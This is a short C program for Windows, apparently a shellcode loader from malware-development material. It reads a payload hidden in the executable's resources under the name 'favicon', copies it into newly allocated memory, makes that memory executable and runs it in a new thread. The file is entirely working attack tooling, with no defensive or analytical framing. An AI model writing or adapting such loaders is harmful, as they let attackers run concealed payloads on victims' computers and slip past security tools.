#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "resources.h"

int main(void)
{
	void *exec_mem; 
	unsigned char *payload; 
	unsigned int payload_sz; 
	
	// extract payload from .rsrc section 
	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(favicon), RT_RCDATA);
	HGLOBAL rh = LoadResource(NULL, res); 
	payload = (char *)LockResource(rh); 
	payload_sz = SizeofResource(NULL, res); 
	
	// allocate memory for payload 
	exec_mem = VirtualAlloc(0, payload_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	
	// copy payload to allocated memory 
	RtlMoveMemory(exec_mem, payload, payload_sz); 
	
	// make memory executable 
	DWORD old = 0; 
	BOOL rv = VirtualProtect(exec_mem, payload_sz, PAGE_EXECUTE_READ, &old); 
	
	if (rv != 0) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0); 
		WaitForSingleObject(th, -1); 
	}
	
	return 0;
}
